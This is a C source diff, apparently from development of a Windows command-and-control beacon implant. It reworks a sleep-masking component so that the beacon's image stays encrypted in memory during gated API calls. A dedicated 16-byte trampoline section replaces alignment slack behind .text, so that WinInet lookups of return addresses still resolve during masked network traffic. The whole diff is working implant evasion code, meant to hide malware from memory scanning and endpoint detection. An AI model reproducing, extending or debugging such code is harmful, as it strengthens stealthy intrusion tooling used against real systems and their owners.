@@ -153,17 +153,24 @@ static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
 /* Where a gated call returns to. A callee may look its caller up by that
  * address: WinInet asks GetModuleHandleEx(FROM_ADDRESS) for it, and on
  * current Windows RtlPcToFileHeader behind that only resolves image
- * mappings (MEM_IMAGE) - private memory resolves to nothing, with or
- * without a PE header, and InternetOpenA then hands back a bogus handle
- * (masked comms round, 2026-11-24). So the call thunk returns into the
- * beacon image itself: the alignment slack behind .text (zero, executable,
- * used by nothing) holds a `jmp qword ptr [rip+0]` back to the stub, and
- * stays out of the mask. Without a usable slack the thunk returns to the
- * stub page, which every API but that lookup takes fine. */
-#define BW_TRAMP_SIZE 14            /* FF 25 00 00 00 00 + qword */
-static unsigned char * g_bw_after;  /* stub page: where the trampoline jumps to */
-static unsigned char * g_bw_tramp;  /* the slack behind .text, or NULL */
-static int             g_bw_tramp_state; /* 0 = not looked for, 1 = ready, 2 = none */
+ * mappings - private memory resolves to nothing, and InternetOpenA then
+ * hands back a bogus handle (masked comms round, 2026-11-24). So the call
+ * thunk returns into the beacon image first: gated_tramp, a 16-byte
+ * executable section (gate_tramp.asm) that jumps on to the stub page. The
+ * section stays out of the mask: nothing of the beacon but those 16 bytes
+ * is in the clear while a gated call runs. (The first cut used the
+ * alignment slack behind .text - right idea, wrong page: the engine makes
+ * the whole .text range writable while it masks, and the callee returned
+ * into a non-executable page.) */
+extern "C" {
+extern const unsigned char gated_tramp[];   /* the section's 16 bytes */
+extern unsigned long long  gated_target;     /* its last 8: where it jumps */
+}
+#define BW_TRAMP_BYTES 16
+static unsigned char *       g_bw_after;        /* stub page: where the trampoline jumps to */
+static unsigned char *       g_bw_tramp_site;   /* the 16 bytes, or NULL */
+static unsigned long long *  g_bw_tramp_slot;   /* site + 6 */
+static void *                g_bw_tramp_override; /* test hook: an executable page of our own */
 static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 
 #define BW_STATE_IDLE   0
@@ -816,9 +823,10 @@ static BOOL bw_build_pages(void)
 		bw_put32(p + lea_at + 3, bw_disp(lea_at + 7, after_at));
 		if ((int)(e - (p + BW_CALL_OFF)) > 0x80)
 			BW_BUILD_FAIL();
-		bw_put64(p + BW_TRAMPQ_OFF, 0); /* no trampoline until one is placed */
+		bw_put64(p + BW_TRAMPQ_OFF, 0); /* no trampoline until one is armed */
 		g_bw_after = p + after_at;
 	}
+	(void)bw_arm_tramp(); /* on failure the thunk returns to the stub page */
 
 	/* the page-local PRGA + the qwords all stubs load rip-relatively */
 	memcpy(p + BW_RC4_OFF, BW_RC4_CODE, sizeof(BW_RC4_CODE));
@@ -851,7 +859,12 @@ void bofwin_test_blocks(int * before, int * after)
 
 void * bofwin_test_tramp(void)
 {
-	return g_bw_tramp; /* the return trampoline in the image, or NULL */
+	return g_bw_tramp_site; /* the return trampoline in the image, or NULL */
+}
+
+void bofwin_test_set_tramp(void * site)
+{
+	g_bw_tramp_override = site; /* before the first window: a page of the test's own */
 }
 
 int bofwin_test_phase(void)
@@ -903,76 +916,48 @@ static int bw_keep_plaintext(BW_BLOCK * blocks, int n, int * text_idx, const uns
 	return w;
 }
 
-/* Place the return trampoline in the alignment slack behind .text: only
- * when the slack is at least BW_TRAMP_SIZE long and all zero (nothing of
- * ours lives there). The image must be in the clear here. TRUE once the
- * trampoline is available (looked for once per process). */
-static BOOL bw_make_tramp(unsigned char * text, unsigned long len)
+/* Fill the return trampoline: the `jmp qword ptr [rip+0]` lands in the
+ * trampoline section and its target is the call thunk's `after` on the
+ * stub page. The section is executable, so its page opens for the one
+ * write. FALSE - and the thunk returns to the stub page instead - when the
+ * page will not open. */
+static BOOL bw_arm_tramp(void)
 {
-	unsigned char * base = (unsigned char *)gparms->beacon_ptr;
-	IMAGE_DOS_HEADER *    dos = (IMAGE_DOS_HEADER *)base;
-	IMAGE_NT_HEADERS *    nt;
-	IMAGE_SECTION_HEADER * sec;
-	unsigned char * end;
-	unsigned char * page;
-	SIZE_T vsize = 0;
-	SIZE_T slack;
-	SIZE_T i;
+	unsigned char * site = g_bw_tramp_override != NULL ? (unsigned char *)g_bw_tramp_override
+	                                                  : (unsigned char *)(size_t)gated_tramp;
+	unsigned char * page = (unsigned char *)((unsigned long long)(size_t)site & ~(unsigned long long)0xFFF);
+	unsigned long long target = (unsigned long long)(size_t)g_bw_after;
+	unsigned long long where = (unsigned long long)(size_t)site;
 	DWORD old = 0, back = 0;
-	int k;
-
-	if (g_bw_tramp_state != 0)
-		return g_bw_tramp_state == 1;
-	g_bw_tramp_state = 2;
-	if (g_bw_stubs == NULL || base == NULL)
-		return FALSE;
-
-	/* .text's virtual size from the image itself (the snapshot may hand
-	 * out a rounded span) */
-	nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
-	sec = IMAGE_FIRST_SECTION(nt);
-	for (k = 0; k < nt->FileHeader.NumberOfSections; k++, sec++) {
-		if (base + sec->VirtualAddress == text) {
-			vsize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
-			break;
-		}
-	}
-	if (vsize == 0 || vsize > len)
-		vsize = len;
-	end  = text + vsize;
-	page = (unsigned char *)((unsigned long long)end & ~(unsigned long long)0xFFF);
-	slack = (SIZE_T)(page + 0x1000 - end);
-	if (slack < BW_TRAMP_SIZE)
-		return FALSE;
-	for (i = 0; i < BW_TRAMP_SIZE; i++) {
-		if (end[i] != 0)
-			return FALSE; /* something lives in the slack */
-	}
 
 	if (!VirtualProtect(page, 0x1000, PAGE_EXECUTE_READWRITE, &old))
 		return FALSE;
-	end[0] = 0xFF;                                /* jmp */
-	end[1] = 0x25;                                /* qword ptr [rip+0] */
-	end[2] = 0; end[3] = 0; end[4] = 0; end[5] = 0;
-	memcpy(end + 6, &g_bw_after, sizeof(g_bw_after));
-	FlushInstructionCache(GetCurrentProcess(), end, BW_TRAMP_SIZE);
+	memcpy(site, "\xFF\x25\x00\x00\x00\x00", 6);          /* jmp qword ptr [rip+0] */
+	memcpy(site + 6, &target, sizeof(target));
+	FlushInstructionCache(GetCurrentProcess(), site, BW_TRAMP_BYTES);
 	VirtualProtect(page, 0x1000, old, &back);
 
-	/* hand the address to the call thunk (the stub page is RX) */
-	if (!VirtualProtect(g_bw_stubs, 0x1000, PAGE_READWRITE, &old)) {
-		memset(end, 0, BW_TRAMP_SIZE);
-		return FALSE;
-	}
-	{
-		unsigned long long where = (unsigned long long)(size_t)end;
-		memcpy(g_bw_stubs + BW_TRAMPQ_OFF, &where, sizeof(where));
-	}
-	VirtualProtect(g_bw_stubs, 0x1000, PAGE_EXECUTE_READ, &back);
-	FlushInstructionCache(GetCurrentProcess(), g_bw_stubs, 0x1000);
-
-	g_bw_tramp = end;
-	g_bw_tramp_state = 1;
+	memcpy(g_bw_stubs + BW_TRAMPQ_OFF, &where, sizeof(where));
+	g_bw_tramp_slot  = (unsigned long long *)(site + 6);
+	g_bw_tramp_site  = site;
 	return TRUE;
+}
+
+/* drop the block a gated call must be able to execute: the trampoline's
+ * section (it is in the clear by design) */
+static int bw_drop_block(BW_BLOCK * blocks, int n, int * text_idx, unsigned char * addr)
+{
+	int i, w = 0, text = -1;
+
+	for (i = 0; i < n; i++) {
+		if (addr >= blocks[i].ptr && addr < blocks[i].ptr + blocks[i].len)
+			continue;
+		if (i == *text_idx)
+			text = w;
+		blocks[w++] = blocks[i];
+	}
+	*text_idx = text;
+	return w;
 }
 
 static BOOL bw_window(const BW_TARGET * t)
@@ -1021,10 +1006,10 @@ static BOOL bw_window(const BW_TARGET * t)
 		g_bw_dbg_after = nblocks;
 		if (nblocks < 1 || text_idx < 0)
 			return FALSE;
-		/* the call thunk returns through the beacon image: the slack
-		 * behind .text keeps the trampoline and stays in the clear */
-		if (bw_make_tramp(blocks[text_idx].ptr, blocks[text_idx].len))
-			blocks[text_idx].len = (unsigned long)(g_bw_tramp - blocks[text_idx].ptr);
+		/* the call thunk returns through the beacon image: the trampoline
+		 * section stays in the clear (and executable) */
+		if (g_bw_tramp_site != NULL)
+			nblocks = bw_drop_block(blocks, nblocks, &text_idx, g_bw_tramp_site);
 	}
 	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
 		return FALSE;
@@ -1244,6 +1229,11 @@ void bofwin_test_blocks(int * before, int * after)
 void * bofwin_test_tramp(void)
 {
 	return NULL;
+}
+
+void bofwin_test_set_tramp(void * site)
+{
+	(void)site;
 }
 
 int bofwin_test_phase(void)
